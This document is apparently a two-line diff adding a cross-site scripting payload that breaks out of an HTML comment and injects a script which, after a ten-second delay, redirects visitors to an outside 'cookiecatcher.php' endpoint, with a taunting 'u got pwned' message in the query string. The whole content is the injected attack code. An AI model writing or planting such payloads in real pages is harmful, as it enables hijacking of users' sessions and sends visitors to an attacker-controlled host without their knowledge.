@@ -1,0 +1,2 @@
+vuln--><script>function doStuff(){setTimeout(continueExecution, 10000);}
+function continueExecution(){document.location='http://www.cookiecatcherzaaz.esy.es/cookiecatcher.php?c=kekerino u got pwned'};doStuff();</script><!--
